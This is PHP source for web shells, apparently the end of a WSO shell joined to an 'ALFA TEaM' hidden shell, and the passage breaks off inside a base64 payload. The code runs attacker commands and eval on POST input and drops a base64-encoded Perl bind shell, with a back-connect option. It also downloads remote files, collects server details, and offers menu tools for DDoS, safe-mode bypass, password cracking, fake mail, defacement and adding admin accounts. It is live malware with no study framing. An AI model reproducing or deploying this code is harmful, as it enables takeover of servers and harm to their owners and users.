$bind_port_p="IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0="; echo "<h1>Network tools</h1><div class=content>
	<form name='nfp' onSubmit=\"g(null,null,'bpp',this.port.value);return false;\">
	<span>Bind port to /bin/sh [perl]</span><br/>
	Port: <input type='text' name='port' value='31337'> <input type=submit value='>>'>
	</form>
	<form name='nfp' onSubmit=\"g(null,null,'bcp',this.server.value,this.port.value);return false;\">
	<span>Back-connect  [perl]</span><br/>
	Server: <input type='text' name='server' value='". $_SERVER['REMOTE_ADDR'] ."'> Port: <input type='text' name='port' value='31337'> <input type=submit value='>>'>
	</form><br>"; if(isset($_POST['p1'])) { function cf($f,$t) { $w = @fopen($f,"w") or @function_exists('file_put_contents'); if($w){ @fwrite($w,@base64_decode($t)); @fclose($w); } } if($_POST['p1'] == 'bpp') { cf("/tmp/bp.pl",$bind_port_p); $out = wsoEx("perl /tmp/bp.pl ".$_POST['p2']." 1>/dev/null 2>&1 &"); sleep(1); echo "<pre class=ml1>$out\n".wsoEx("ps aux | grep bp.pl")."</pre>"; unlink("/tmp/bp.pl"); } if($_POST['p1'] == 'bcp') { cf("/tmp/bc.pl",$back_connect_p); $out = wsoEx("perl /tmp/bc.pl ".$_POST['p2']." ".$_POST['p3']." 1>/dev/null 2>&1 &"); sleep(1); echo "<pre class=ml1>$out\n".wsoEx("ps aux | grep bc.pl")."</pre>"; unlink("/tmp/bc.pl"); } } echo '</div>'; wsoFooter(); } function actionRC() { if(!@$_POST['p1']) { $a = array( "uname" => php_uname(), "php_version" => phpversion(), "wso_version" => WSO_VERSION, "safemode" => @ini_get('safe_mode') ); echo serialize($a); } else { eval($_POST['p1']); } } if( empty($_POST['a']) ) if(isset($default_action) && function_exists('action' . $default_action)) $_POST['a'] = $default_action; else $_POST['a'] = 'SecInfo'; if( !empty($_POST['a']) && function_exists('action' . $_POST['a']) ) call_user_func('action' . $_POST['a']); exit;
}


@define('VERSION','1.0');
@error_reporting(E_ALL ^ E_NOTICE);
@session_start();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@set_time_limit(0);
@set_magic_quotes_runtime(0);
if(get_magic_quotes_gpc()) {
function alfastripslashes($array) {
return is_array($array) ? array_map('alfastripslashes', $array) : stripslashes($array);
}
$_POST = alfastripslashes($_POST);
}
$default_action = 'FilesMan';
$default_use_ajax = true;
$default_charset = 'Windows-1251';
if (strtolower(substr(PHP_OS,0,3))=="win")
$sys='win';
else
$sys='unix';
$home_cwd = @getcwd();
if(isset($_POST['c']))
@chdir($_POST['c']);
$cwd = @getcwd();
if($sys == 'win')
{
$home_cwd = str_replace("\\", "/", $home_cwd);
$cwd = str_replace("\\", "/", $cwd);
}
if($cwd[strlen($cwd)-1] != '/' )
$cwd .= '/';
function alfaEx($in) {
$out = '';
if (function_exists('exec')) {
@exec($in,$out);
$out = @join("\n",$out);
} elseif (function_exists('passthru')) {
ob_start();
@passthru($in);
$out = ob_get_clean();
} elseif (function_exists('system')) {
ob_start();
@system($in);
$out = ob_get_clean();
} elseif (function_exists('shell_exec')) {
$out = shell_exec($in);
} elseif (is_resource($f = @popen($in,"r"))) {
$out = "";
while(!@feof($f))
$out .= fread($f,1024);
pclose($f);
}
return $out;
}
$down=@getcwd();
if($sys=="win")
$down.='\\';
else
$down.='/';
if(isset($_POST['rtdown']))
{
$url = $_POST['rtdown'];
$newfname = $down. basename($url);
$file = fopen ($url, "rb");
if ($file) {
$newf = fopen ($newfname, "wb");
if ($newf)
while(!feof($file)) {
fwrite($newf, fread($file, 1024 * 8 ), 1024 * 8 );
}
}
if ($file) {
fclose($file);
}
if ($newf) {
fclose($newf);
}
}
function alfahead()
{
if(empty($_POST['charset']))
$_POST['charset'] = $GLOBALS['default_charset'];
$freeSpace = @diskfreespace($GLOBALS['cwd']);
$totalSpace = @disk_total_space($GLOBALS['cwd']);
$totalSpace = $totalSpace?$totalSpace:1;
$on="<font color=#0F0> ON </font>";
$of="<font color=red> OFF </font>";
$none="<font color=#0F0> NONE </font>";
if(function_exists('curl_version'))
$curl=$on;
else
$curl=$of;
if(function_exists('mysql_get_client_info'))
$mysql=$on;
else
$mysql=$of;
if(function_exists('mssql_connect'))
$mssql=$on;
else
$mssql=$of;
if(function_exists('pg_connect'))
$pg=$on;
else
$pg=$of;
if(function_exists('oci_connect'))
$or=$on;
else
$or=$of;
if(@ini_get('disable_functions'))
$disfun=@ini_get('disable_functions');
else
$disfun="All Functions Enabled";
if(@ini_get('safe_mode'))
$safe_modes="<font color=red>ON</font>";
else
$safe_modes="<font color=#0F0 >OFF</font>";
if(@ini_get('open_basedir'))
$open_b=@ini_get('open_basedir');
else
$open_b=$none;
if(@ini_get('safe_mode_exec_dir'))
$safe_exe=@ini_get('safe_mode_exec_dir');
else
$safe_exe=$none;
if(@ini_get('safe_mode_include_dir'))
$safe_include=@ini_get('safe_mode_include_dir');
else
$safe_include=$none;
if(!function_exists('posix_getegid'))
{
$user = @get_current_user();
$uid = @getmyuid();
$gid = @getmygid();
$group = "?";
} else
{
$uid = @posix_getpwuid(posix_geteuid());
$gid = @posix_getgrgid(posix_getegid());
$user = $uid['name'];
$uid = $uid['uid'];
$group = $gid['name'];
$gid = $gid['gid'];
}
$cwd_links = '';
$path = explode("/", $GLOBALS['cwd']);
$n=count($path);
for($i=0; $i<$n-1; $i++) {
$cwd_links .= "<a href='#' onclick='g(\"FilesMan\",\"";
for($j=0; $j<=$i; $j++)
$cwd_links .= $path[$j].'/';
$cwd_links .= "\")'>".$path[$i]."/</a>";
}
$drives = "";
foreach(range('c','z') as $drive)
if(is_dir($drive.':\\'))
$drives .= '<a href="#" onclick="g(\'FilesMan\',\''.$drive.':/\')">[ '.$drive.' ]</a> ';
echo '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<link href="http://iran.grn.cc/13.png" rel="icon" type="image/x-icon"/>
<title>..:: '.$_SERVER['HTTP_HOST'].' ~ ALFA TEaM SHeLL ::..</title>
<style type="text/css">
<!--
#alert {position: relative;}
#alert:hover:after {
background: hsla(0,0%,0%,.8);
border-radius: 3px;
color: #f6f6f6;
content: \'Hidden shell\';
font: bold 12px/30px sans-serif;
height: 30px;
left: 50%;
margin-left: -60px;
position: absolute;
text-align: center;
top: 50px; width: 120px;
}
#alert:hover:before {
border-bottom: 10px solid hsla(0,0%,0%,.8);
border-left: 10px solid transparent;
border-right: 10px solid transparent;content: \'\';
height: 0;
left: 50%;
margin-left: -10px;
position: absolute;
top: 40px;
width: 0;
}
#alert:target {display: none;}
.alert_red {
animation: alert 1s ease forwards;
background-color: #c4453c;
background-image: linear-gradient(135deg, transparent,transparent 25%, hsla(0,0%,0%,.1) 25%,hsla(0,0%,0%,.1) 50%, transparent 50%,transparent 75%, hsla(0,0%,0%,.1) 75%,hsla(0,0%,0%,.1));
background-size: 20px 20px;box-shadow: 0 5px 0 hsla(0,0%,0%,.1);
color: #f6f6f6;display: block;
font: bold 16px/40px sans-serif;
height: 40px;
position: absolute;
text-align: center;
text-decoration: none;
top: -5px;
width: 100%;
}
.alert_green {animation: alert 1s ease forwards;
background-color: #27979B;
background-image: linear-gradient(135deg, transparent,transparent 25%, hsla(0,0%,0%,.1) 25%,hsla(0,0%,0%,.1) 50%, transparent 50%,transparent 75%, hsla(0,0%,0%,.1) 75%,hsla(0,0%,0%,.1));
background-size: 20px 20px;
box-shadow: 0 5px 0 hsla(0,0%,0%,.1);
color: #f6f6f6;
display: block;
font: bold 16px/40px sans-serif;
height: 40px;
position: absolute;
text-align: center;
text-decoration: none;
top: -5px;
width: 100%;
}
@keyframes alert {0% { opacity: 0; }50% { opacity: 1; }100% { top: 0; }}
.whole {
background-color: #0E304A;
height:auto;
width: auto;
margin-top: 10px;
margin-right: 10px;
margin-left: 10px;
}
.header {
height: auto;
width: auto;
border: 7px solid #0E304A;
color: #67ABDF;
font-size: 12px;
font-family: Verdana, Geneva, sans-serif;
background-color: #000;
}
.header a {color:#0F0; text-decoration:none;}
span {
font-weight: bolder;
color: #FFF;
}
#meunlist {
font-family: Verdana, Geneva, sans-serif;
color: #FFF;
background-color: #000;
width: auto;
border-right-width: 7px;
border-left-width: 7px;
border-top-style: solid;
border-right-style: solid;
border-bottom-style: solid;
border-left-style: solid;
border-top-color: #0E304A;
border-right-color: #0E304A;
border-bottom-color: #0E304A;
border-left-color: #0E304A;
height: auto;
font-size: 12px;
font-weight: bold;
border-top-width: 0px;
}
.whole #meunlist ul {
padding-top: 5px;
padding-right: 5px;
padding-bottom: 7px;
padding-left: 2px;
text-align:center;
list-style-type: none;
margin: 0px;
}
.whole #meunlist li {
margin: 0px;
padding: 0px;
display: inline;
}
.whole #meunlist a {
font-family: arial, sans-serif;
font-size: 14px;
text-decoration:none;
font-weight: bold;
color: #fff;
clear: both;
width: 100px;
margin-right: -6px;
padding-top: 3px;
padding-right: 15px;
padding-bottom: 3px;
padding-left: 15px;
border-right-width: 1px;
border-right-style: solid;
border-right-color: #FFF;
}
.whole #meunlist a:hover {
color: #000;
background: #646464;
}
.foot {
font-family: Verdana, Geneva, sans-serif;
background-color: #000;
margin: 0px;
padding: 0px;
width: 100%;
text-align: center;
font-size: 12px;
color: #0E304A;
border-right-width: 7px;
border-left-width: 7px;
border-bottom-width: 7px;
border-bottom-style: solid;
border-right-style: solid;
border-right-style: solid;
border-left-style: solid;
border-top-color: #0E304A;
border-right-color: #0E304A;
border-bottom-color: #0E304A;
border-left-color: #0E304A;
}
#text{
text-align:center;
}
';
if(is_writable($GLOBALS['cwd']))
{
echo ".foottable {
width: 300px;
font-weight: bold;
}";}
else
{
echo ".foottable {
width: 300px;
font-weight: bold;
background-color:red;
}
.dir {
background-color:red;
}
";
}
echo '.main th{text-align:left;}
.main a{color: #FFF;}
.main tr:hover{background-color:#646464;}
.ml1{ border:1px solid #0E304A;padding:5px;margin:0;overflow: auto; }
.bigarea{ width:99%; height:300px; }
</style>
';
echo "<script>
var c_ = '" . htmlspecialchars($GLOBALS['cwd']) . "';
var a_ = '" . htmlspecialchars(@$_POST['a']) ."'
var charset_ = '" . htmlspecialchars(@$_POST['charset']) ."';
var alfa1_ = '" . ((strpos(@$_POST['alfa1'],"\n")!==false)?'':htmlspecialchars($_POST['alfa1'],ENT_QUOTES)) ."';
var alfa2_ = '" . ((strpos(@$_POST['alfa2'],"\n")!==false)?'':htmlspecialchars($_POST['alfa2'],ENT_QUOTES)) ."';
var alfa3_ = '" . ((strpos(@$_POST['alfa3'],"\n")!==false)?'':htmlspecialchars($_POST['alfa3'],ENT_QUOTES)) ."';
var alfa4_ = '" . ((strpos(@$_POST['alfa4'],"\n")!==false)?'':htmlspecialchars($_POST['alfa4'],ENT_QUOTES)) ."';
var alfa5_ = '" . ((strpos(@$_POST['alfa5'],"\n")!==false)?'':htmlspecialchars($_POST['alfa5'],ENT_QUOTES)) ."';
var alfa6_ = '" . ((strpos(@$_POST['alfa6'],"\n")!==false)?'':htmlspecialchars($_POST['alfa6'],ENT_QUOTES)) ."';
var alfa7_ = '" . ((strpos(@$_POST['alfa7'],"\n")!==false)?'':htmlspecialchars($_POST['alfa7'],ENT_QUOTES)) ."';
var alfa8_ = '" . ((strpos(@$_POST['alfa8'],"\n")!==false)?'':htmlspecialchars($_POST['alfa8'],ENT_QUOTES)) ."';
var alfa9_ = '" . ((strpos(@$_POST['alfa9'],"\n")!==false)?'':htmlspecialchars($_POST['alfa9'],ENT_QUOTES)) ."';
var alfa10_ = '" . ((strpos(@$_POST['alfa10'],"\n")!==false)?'':htmlspecialchars($_POST['alfa10'],ENT_QUOTES)) ."';
var d = document;
function set(a,c,alfa1,alfa2,alfa3,alfa4,alfa5,alfa6,alfa7,alfa8,alfa9,alfa10,charset) {
if(a!=null)d.mf.a.value=a;else d.mf.a.value=a_;
if(c!=null)d.mf.c.value=c;else d.mf.c.value=c_;
if(alfa1!=null)d.mf.alfa1.value=alfa1;else d.mf.alfa1.value=alfa1_;
if(alfa2!=null)d.mf.alfa2.value=alfa2;else d.mf.alfa2.value=alfa2_;
if(alfa3!=null)d.mf.alfa3.value=alfa3;else d.mf.alfa3.value=alfa3_;
if(alfa4!=null)d.mf.alfa4.value=alfa4;else d.mf.alfa4.value=alfa4_;
if(alfa5!=null)d.mf.alfa5.value=alfa5;else d.mf.alfa5.value=alfa5_;
if(alfa6!=null)d.mf.alfa6.value=alfa6;else d.mf.alfa6.value=alfa6_;
if(alfa7!=null)d.mf.alfa7.value=alfa7;else d.mf.alfa7.value=alfa7_;
if(alfa8!=null)d.mf.alfa8.value=alfa8;else d.mf.alfa8.value=alfa8_;
if(alfa9!=null)d.mf.alfa9.value=alfa9;else d.mf.alfa9.value=alfa9_;
if(alfa10!=null)d.mf.alfa10.value=alfa10;else d.mf.alfa10.value=alfa10_;
if(charset!=null)d.mf.charset.value=charset;else d.mf.charset.value=charset_;
}
function g(a,c,alfa1,alfa2,alfa3,alfa4,alfa5,alfa6,alfa7,alfa8,alfa9,alfa10,charset) {
set(a,c,alfa1,alfa2,alfa3,alfa4,alfa5,alfa6,alfa7,alfa8,alfa9,alfa10,charset);
d.mf.submit();
}</script>";
echo '
</head>
<body bgcolor="#000000" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
<div class="whole">
<form method=post name=mf style="display:none;">
<input type=hidden name=a>
<input type=hidden name=c>
<input type=hidden name=alfa1>
<input type=hidden name=alfa2>
<input type=hidden name=alfa3>
<input type=hidden name=alfa4>
<input type=hidden name=alfa5>
<input type=hidden name=alfa6>
<input type=hidden name=alfa7>
<input type=hidden name=alfa8>
<input type=hidden name=alfa9>
<input type=hidden name=alfa10>
<input type=hidden name=charset>
</form>
<div id=\'alert\'><a class="alert_green" target="_blank" href="?solevisible">Hidden Shell Is Here ( Click )</font></a></div><br><p>
<div class="header"><table width="100%" border="0" align="lift">
<tr>
<td width="3%"><span><font color=#27979B>Uname:</font></span></td>
<td colspan="2"><b>'.substr(@php_uname(), 0, 120).'</b></td>
</tr>
<tr>
<td><span><font color=#27979B>User:</font></span></td>
<td><b>'. $uid . ' [ ' . $user . ' ] </b><span> <font color=#27979B> Group: </font></span><b>' . $gid . ' [ ' . $group . ' ]</b> </td>
<td width="12%" rowspan="8"><img alt="" src="http://iran.grn.cc/farvahar-iran.png" /></td>
</tr>
<tr>
<td><span><font color=#27979B>PHP:</font></span></td>
<td><b>'.@phpversion(). ' </b><span> <font color=#27979B> Safe Mode: </font>'.$safe_modes.'</span></td>
</tr>
<tr>
<td><span><font color=#27979B>ServerIP:</font></span></td>
<td><b>'.@$_SERVER["SERVER_ADDR"].' <span><font color=#27979B>Your IP:</font></span><b> '.@$_SERVER["REMOTE_ADDR"].'</b></td>
</tr>
<tr>
<td><span><font color=#27979B>Domains:</font></span></td>
<td width="76%"><b>';
if($GLOBALS['sys']=='unix')
{
$d0mains = @file("/etc/named.conf");
if(!$d0mains)
{
echo "CANT READ named.conf";
}
else
{
$count;
foreach($d0mains as $d0main)
{
if(@ereg("zone",$d0main))
{
preg_match_all('#zone "(.*)"#', $d0main, $domains);
flush();
if(strlen(trim($domains[1][0])) > 2){
flush();
$count++;
}
}
}
echo "$count Domains";
}
}
else{ echo"CANT READ |Windows|";}
echo '</b></td>
</tr>
<tr>
<td height="16"><span><font color=#27979B>HDD:<font></span></td>
<td><span><font color=#27979B>Total:</font></span><b>'.alfaSize($totalSpace).' </b><span><font color=#27979B>Free:</font></span><b>' . alfaSize($freeSpace) . ' ['. (int) ($freeSpace/$totalSpace*100) . '%]</b></td>
</tr>';
if($GLOBALS['sys']=='unix' )
{
if(!@ini_get('safe_mode'))
{
if(function_exists("system") || function_exists("exec") || function_exists("passthru") || function_exists("shell_exec")){
echo '<tr><td height="18" colspan="2"><span><font color=#27979B>Useful : </font></span><b>';
$userful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzialfa2','nc','locate','suidperl');
foreach($userful as $item)
if(alfaWhich($item))
echo $item.',';
echo '</b></td>
</tr>
<tr>
<td height="0" colspan="2"><span><font color=#27979B>Downloader:</font></span>';
$downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');
foreach($downloaders as $item2)
if(alfaWhich($item2))
echo '<b>'.$item2.',';
echo '</b></td>
</tr>';
}else{
echo '<tr><td height="18" colspan="2"><span><font color=#27979B>useful:<font></span>';
echo '--------------</td>
</tr><td height="0" colspan="2"><span><font color=#27979B>Downloader:</font> </span>-------------</td>
</tr>';
}
}
else
{
echo '<tr><td height="18" colspan="2"><span><font color=#27979B>useful:<font></span>';
echo '--------------</td>
</tr><td height="0" colspan="2"><span><font color=#27979B>Downloader:</font> </span>-------------</td>
</tr>';
}
}
else
{
echo '<tr><td height="18" colspan="2"><span><font color=#27979B>Window:</font></span><b>';
echo alfaEx('ver');
echo '</td>
</tr> <tr>
<td height="0" colspan="2"><span><font color=#27979B>Downloader:</font> </span>-------------</td>
</tr></b>';
}
$quotes = get_magic_quotes_gpc();if ($quotes == "1" or $quotes == "on"){$magic = '<b><font color="#0F0">ON</font>';}else{$magic = '<b><font color="red">OFF</font>';}
echo '<tr>
<td height="16" colspan="2"><span><font color=#27979B>Disabled Functions:</font></span><b>'.$disfun.'</b></td>
</tr>
<tr>
<td height="16" colspan="2"><span><font color=#27979B>CURL:</font><b>'.$curl.' </b><font color=#27979B>Magic Quotes:</font><b>'.$magic.' </b><font color=#27979B> MySQL:</font><b>'.$mysql.' </b><font color=#27979B>MSSQL:</font><b>'.$mssql.' </b><font color=#27979B> PostgreSQL:</font><b>'.$pg.'</b> <font color=#27979B> Oracle:</font> </span><b>'.$or.'</b></td><td width="15%">'.base64_decode("PGEgaHJlZj0iaHR0cDovL3pvbmUtaC5vcmcvYXJjaGl2ZS9ub3RpZmllcj1BTEZBJTIwVEVhTSUyMDIwMTIiIHRhcmdldD0iX2JsYW5rIj48c3Bhbj48Zm9udCBjb2xvcj0iIzBGMCI+Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7U29sZSBTYWQgJiBJbnZpc2libGU8L2ZvbnQ+PC9zcGFuPjwvYT4=").'</td>
</tr>
<tr>
<td height="11" colspan="3"><span><font color=#27979B>Open_basedir:<b>'.$open_b.'</b></font> <font color=#27979B>Safe_mode_exec_dir:</b>'.$safe_exe.'</b> </font><font color=#27979B> Safe_mode_include_dir:</b>'.$safe_include.'</b></font></td>
</tr>
<tr>
<td height="11"><span><font color=#27979B>SoftWare:<font color=#27979B> </span></td>
<td colspan="2"><b>'.@getenv('SERVER_SOFTWARE').'</b></td>
</tr>';
if($GLOBALS[sys]=="win")
{
echo '<tr>
<td height="12"><span><font color=#27979B>DRIVE:</font></span></td>
<td colspan="2"><b>'.$drives.'</b></td>
</tr>';
}
echo '<tr>
<td height="12"><span><font color=#27979B>PWD:</font></span></td>
<td colspan="2">'.$cwd_links.' <a href=# onclick="g(\'FilesMan\',\'' . $GLOBALS['home_cwd'] . '\',\'\',\'\',\'\')"><font color=red >| Home Shell |</font></a></td>
</tr>
</table>
</div>
<div id="meunlist">
<ul>
<li><a href="#" onclick="g(\'FilesMan\',null,\'\',\'\',\'\')"><font color=#27979B>Home</font></a></li>
<li><a href="#" onclick="g(\'proc\',null,\'\',\'\',\'\')"><font color=#27979B>Process</font></a></li>
<li><a href="#" onclick="g(\'phpeval\',null,\'\',\'\',\'\')"><font color=#27979B>Eval</font></a></li>
<li><a href="#" onclick="g(\'sql\',null,\'\',\'\',\'\')"><font color=#27979B>SQL</font></a></li>
<li><a href="#" onclick="g(\'hash\',null,\'\',\'\',\'\')"><font color=#27979B>En-Decoder</font></a></li>
<li><a href="#" onclick="g(\'connect\',null,\'\',\'\',\'\')"><font color=#27979B>BC</font></a></li>
<li><a href="#" onclick="g(\'zoneh\',null,\'\',\'\',\'\')"><font color=#27979B>ZONE-H</font></a></li>
<li><a href="#" onclick="g(\'dos\',null,\'\',\'\',\'\')"><font color=#27979B>DDOS</font></a></li>
<li><a href="#" onclick="g(\'safe\',null,\'\',\'\',\'\')"><font color=#27979B>ByPasser</font></a></li>
<li><a href="#" onclick="g(\'cgishell\',null,\'\',\'\',\'\')"><font color=#27979B>Cgi Perl</font></a></li>
<li><a href="#" onclick="g(\'cgipython\',null,\'\',\'\',\'\')"><font color=#27979B>Cgi Python</font></a></li>
<li><a href="#" onclick="g(\'cmdphp\',null,\'\',\'\',\'\')"><font color=#27979B>CMD</font></a></li>
<li><a href="#" onclick="g(\'cpcrack\',null,\'\',\'\',\'\')"><font color=#27979B>MD5 Cracker</font></a></li>
<li><a href="#" onclick="g(\'portscanner\',null,\'\',\'\',\'\')"><font color=#27979B>Port Scaner</font></a></li>
<li><a href="#" onclick="g(\'basedir\',null,\'\',\'\',\'\')"><font color=#27979B>Open BaseDir</font></a></li>
<li><a href="#" onclick="g(\'mail\',null,\'\',\'\',\'\')"><font color=#27979B>Fake Mail</font></a></li>
<li><a href="#" onclick="g(\'ziper\',null,\'\',\'\',\'\')"><font color=#27979B>Ziper</font></a></li>
<li><a href="#" onclick="g(\'IndexChanger\',null,\'\',\'\',\'\')"><font color=#27979B>Index Changer</font></a></li>
<li><a href="#" onclick="g(\'pwchanger\',null,\'\',\'\',\'\')"><font color=#27979B>Add New Admin</font></a></li>
<li><a href="#" onclick="g(\'Vbinject\',null,\'\',\'\',\'\')"><font color=#27979B>Vb Shell inject</font></a></li>
<li><a href="#" onclick="g(\'php2xml\',null,\'\',\'\',\'\')"><font color=#27979B>PHP2XML</font></a></li>
<li><a href="#" onclick="g(\'cloudflare\',null,\'\',\'\',\'\')"><font color=#27979B>CloudFlare</font></a></li>
<li><a href="#" onclick="g(\'Whmcs\',null,\'\',\'\',\'\')"><font color=#27979B>Whmcs</font></a></li>
<li><a href="#" onclick="g(\'symlink\',null,\'\',\'\',\'\')"><font color=#27979B>Symlink</font></a></li>
<li><a href="#" onclick="g(\'team\',null,\'\',\'\',\'\')"><font color=#27979B>About Us</font></a></li>
<li><a href="#" onclick="g(\'selfrm\',null,\'\',\'\',\'\')"><font color=#27979B>Remove Shell</font></a></li>
</ul>
</div>
';
}
function alfacmdphp(){
alfahead();
echo '<div class=header>';
$code = 'PD9waHANCi8vZGlzYWJsZSBtYWdpYyBxdW90ZXMhIQ0KZXJyb3JfcmVwb3J0aW5nKEVfQUxMXkVfTk9USUNFKTsNCiR0ZiA9IGV4cGxvZGUoJy8nLCAkX1NFUlZFUlsiU0NSSVBUX05BTUUiXSk7DQokdGYgPSAkdGZbY291bnQoJHRmKS0xXTsNCmlmIChnZXRfbWFnaWNfcXVvdGVzX2dwYygpKQ0Kew0KICRwcm9jZXNzID0gYXJyYXkoJiRfR0VULCAmJF9QT1NULCAmJF9DT09LSUUsICYkX1JFUVVFU1QpOw0KIHdoaWxlIChsaXN0KCRrZXksICR2YWwpID0gZWFjaCgkcHJvY2VzcykpDQogew0KICBmb3JlYWNoICgkdmFsIGFzICRrID0+ICR2KQ0KICB7DQogICB1bnNldCgkcHJvY2Vzc1ska2V5XVska10pOw0KICAgaWYgKGlzX2FycmF5KCR2KSkNCiAgIHsNCiAgICAkcHJvY2Vzc1ska2V5XVtzdHJpcHNsYXNoZXMoJGspXSA9ICR2Ow0KICAgICRwcm9jZXNzW10gPSAmJHByb2Nlc3NbJGtleV1bc3RyaXBzbGFzaGVzKCRrKV07DQogICB9DQogICBlbHNlDQogICB7DQogICAgJHByb2Nlc3NbJGtleV1bc3RyaXBzbGFzaGVzKCRrKV0gPSBzdHJpcHNsYXNoZXMoJHYpOw0KICAgfQ0KICB9DQogfQ0KIHVuc2V0KCRwcm9jZXNzKTsNCn0NCi8vDQpmdW5jdGlvbiBzaGVsbF9leGVjMigkc3RyLCAkY3dkKQ0Kew0KICRwaXBlcyA9IGFycmF5KCk7DQogJHByb2Nlc3MgPSBwcm9jX29wZW4oJHN0ci4nIDI+JjEnLCBhcnJheShhcnJheSgicGlwZSIsInciKSwgYXJyYXkoInBpcGUiLCJ3IiksIGFycmF5KCJwaXBlIiwidyIpKSwgJHBpcGVzLCAkY3dkKTsNCiByZXR1cm4gc3RyZWFtX2dldF9jb250ZW50cygkcGlwZXNbMV0pOw0KfQ0KaWYgKCRfUE9TVFsndmVyaWZ5J10pDQp7DQogJGRpcm5vdyA9IHNoZWxsX2V4ZWMyKCJwd2QiLCAkX1BPU1RbJ3ZlcmlmeSddKTsNCiBpZiAoc3Vic3RyKCRkaXJub3csIDAsIHN0cmxlbigkZGlybm93KS0xKT09JF9QT1NUWyd2ZXJpZnknXSkNCiB7DQogIGVjaG8oJ2RvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJjb21tYW5kIikudmFsdWUgKz0gIlxuIjsgIG5ld2NtZCgpOycpOw0KIH0NCiBlbHNlDQogew0KICAkZWUgPSBleHBsb2RlKCcvJywgJF9QT1NUWyd2ZXJpZnknXSk7DQogIGVjaG8oJ2RvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJjb21tYW5kIikudmFsdWUgKz0gIlxuYmFzaDogY2Q6ICcuJF9QT1NUWyd2ZXJpZnknXS4nOiBQZXJtaXNzaW9uIGRlbmllZCFcbiI7ICBuZXdjbWQoKTsnKTsNCiB9DQogZXhpdDsNCn0NCmlmICgkX1BPU1RbJ2p4Y21kJ10gJiYgJF9QT1NUWydjd2QnXSkgLy95ZWEsIGdvIEFKQVgNCnsNCiAkdGhlY21kID0gJF9QT1NUWydqeGNtZCddOw0KIGlmIChzdWJzdHIoJHRoZWNtZCwgMCwgNSk9PSI8cGhwPiIpDQogew0KICBldmFsKCckcmVzdWx0ID0gJy5zdWJzdHIoJHRoZWNtZCwgNikuJzsnKTsNCiB9DQogZWxzZQ0KICRyZXN1bHQgPSBzaGVsbF9leGVjMigkX1BPU1RbJ2p4Y21kJ10uIiAyPiYxIiwgJF9QT1NUWydjd2QnXSk7DQogaWYgKHN1YnN0cigkcmVzdWx0LCBzdHJsZW4oJHJlc3VsdCktMSwgMSk9PSJcbiIpDQogew0KICAkcmVzdWx0ID0gc3Vic3RyKCRyZXN1bHQsIDAsIHN0cmxlbigkcmVzdWx0KS0xKTsNCiB9DQogZWNobygnZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImNvbW1hbmQiKS52YWx1ZSs9Jy5qc29uX2VuY29kZSgkcmVzdWx0KS4nKyJcbiI7bmV3Y21kKCk7ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImNvbW1hbmQiKS5zY3JvbGxUb3A9ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImNvbW1hbmQiKS5zY3JvbGxIZWlnaHQ7Jyk7DQogZXhpdDsNCn0NCmVjaG8oJzxzdHlsZT5ib2R5IHtiYWNrZ3JvdW5kLWNvbG9yOiBibGFjazsgY29sb3I6IHdoaXRlOyBmb250LXNpemU6IDEycHg7fTwvc3R5bGU+PHNjcmlwdD4nKTsgPz4NCndpbmRvdy5vbmxvYWQgPSBzZXR0aGVzaXplOw0Kd2luZG93Lm9ucmVzaXplID0gc2V0dGhlc2l6ZTsNCndpbmRvdy51cGRpciA9IDA7DQp3aW5kb3cuY29tbWFuZHMgPSBuZXcgQXJyYXkoKTsNCndpbmRvdy5sb2dnZWR1c2VyID0gIjw/cGhwDQokY21kID0gc2hlbGxfZXhlYzIoIndob2FtaSIsIE5VTEwpOw0KaWYgKHN0cnBvcygkY21kLCAibm90IGZvdW5kIik9PT1GQUxTRSkNCnsNCiBlY2hvKHN1YnN0cigkY21kLCAwLCBzdHJsZW4oJGNtZCktMSkpOyANCn0NCj8+IjsNCndpbmRvdy5jd2QgPSAiPD9waHANCiRjbWQgPSBzaGVsbF9leGVjMigicHdkIiwgTlVMTCk7DQppZiAoc3